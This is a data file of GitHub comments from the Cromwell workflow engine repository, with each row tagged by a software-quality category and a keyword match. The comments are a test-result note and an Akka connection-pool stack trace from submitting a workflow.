https://github.com/broadinstitute/cromwell/pull/6348#issuecomment-840128126:12,Testability,test,test,12,"Yes the new test failed previously, the output would have been marked as `optional` when it should have been `required`. Existing tests for cases where file outputs should be optional are still passing, so yay.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6348#issuecomment-840128126
https://github.com/broadinstitute/cromwell/pull/6348#issuecomment-840128126:130,Testability,test,tests,130,"Yes the new test failed previously, the output would have been marked as `optional` when it should have been `required`. Existing tests for cases where file outputs should be optional are still passing, so yay.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6348#issuecomment-840128126
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:312,Availability,ERROR,ERROR,312,"When run the server modle; ```; root@NanoTNGS-DEV:~# java -jar /root/cromwell/cromwell-62.jar submit -t wdl hello.wdl -h http://localhost:8000; [2021-05-14 14:28:43,33] [info] Slf4jLogger started; [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:499,Availability,down,down,499,"When run the server modle; ```; root@NanoTNGS-DEV:~# java -jar /root/cromwell/cromwell-62.jar submit -t wdl hello.wdl -h http://localhost:8000; [2021-05-14 14:28:43,33] [info] Slf4jLogger started; [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1533,Availability,Fault,FaultHandling,1533,/SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1563,Availability,Fault,FaultHandling,1563,/SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1612,Availability,Fault,FaultHandling,1612,/SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1636,Availability,Fault,FaultHandling,1636,/SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1685,Availability,Fault,FaultHandling,1685,/SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1710,Availability,Fault,FaultHandling,1710,/SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1103,Energy Efficiency,adapt,adapted,1103,"hello.wdl -h http://localhost:8000; [2021-05-14 14:28:43,33] [info] Slf4jLogger started; [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:1103,Modifiability,adapt,adapted,1103,"hello.wdl -h http://localhost:8000; [2021-05-14 14:28:43,33] [info] Slf4jLogger started; [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550:626,Testability,Log,Logic,626,"When run the server modle; ```; root@NanoTNGS-DEV:~# java -jar /root/cromwell/cromwell-62.jar submit -t wdl hello.wdl -h http://localhost:8000; [2021-05-14 14:28:43,33] [info] Slf4jLogger started; [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; java.lang.IllegalStateException: Pool shutdown unexpectedly; 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); 	at akka.dispatch.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-841048550
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:328,Availability,ERROR,ERROR,328,"> When run the server modle; > ; > ```; > root@NanoTNGS-DEV:~# java -jar /root/cromwell/cromwell-62.jar submit -t wdl hello.wdl -h http://localhost:8000; > [2021-05-14 14:28:43,33] [info] Slf4jLogger started; > [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; > [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; > java.lang.IllegalStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
